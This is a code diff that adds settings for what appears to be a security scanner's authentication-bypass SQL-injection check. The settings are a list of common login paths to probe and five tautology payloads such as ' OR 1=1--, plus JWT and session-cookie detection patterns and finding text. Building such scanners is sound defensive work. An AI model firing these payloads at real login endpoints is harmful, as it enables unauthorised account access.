@@ -1444,6 +1444,42 @@ class InjectionConfig:
     # Minimum baseline response size to compare against
     NOSQL_MIN_BASELINE_SIZE = 20
 
+    # --- Authentication-bypass (boolean) SQLi ---
+    # Login POST endpoints are rarely recoverable from a minified SPA bundle, so
+    # the oracle probes a conventional set of login paths relative to the target
+    # (standard DAST forced-browsing), then runs a differential: a benign invalid
+    # credential must be REJECTED and a SQL tautology must AUTHENTICATE.
+    AUTH_LOGIN_PATHS = (
+        "/rest/user/login", "/login", "/api/login", "/auth/login",
+        "/api/auth/login", "/users/login", "/user/login", "/signin",
+        "/api/signin", "/session", "/sessions", "/api/session",
+        "/account/login", "/auth",
+    )
+    AUTH_IDENTITY_FIELDS = ("email", "username", "user", "login")
+    AUTH_PASSWORD_FIELD = "password"
+    AUTH_BYPASS_PAYLOADS = (
+        "' OR 1=1--",
+        "' OR '1'='1",
+        "admin'--",
+        "') OR ('1'='1",
+        "' OR 1=1#",
+    )
+    # A response "looks authenticated" only if 2xx AND it carries a session token
+    # (JWT or a token field) or sets a session cookie.
+    AUTH_TOKEN_PATTERNS = (
+        r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+",   # JWT
+        r'(?i)"(?:access_?token|id_token|jwt|token)"\s*:\s*"[^"]{10,}"',
+    )
+    AUTH_SESSION_COOKIE_PATTERN = r"(?i)(session|sess|sid|token|auth|jwt|connect\.sid)"
+    CONFIDENCE_AUTH_BYPASS = 0.9
+    TITLE_AUTH_BYPASS = "SQL injection vulnerability (authentication bypass)"
+    DESC_AUTH_BYPASS = (
+        "The login endpoint {url} authenticated a request whose `{field}` field "
+        "contained a SQL tautology ({payload}) and whose password was invalid — "
+        "a boolean / authentication-bypass SQL injection. A benign invalid "
+        "credential was rejected; the tautology returned a valid session."
+    )
+
     # XXE / XML injection
     CONFIDENCE_XXE = 0.90
 
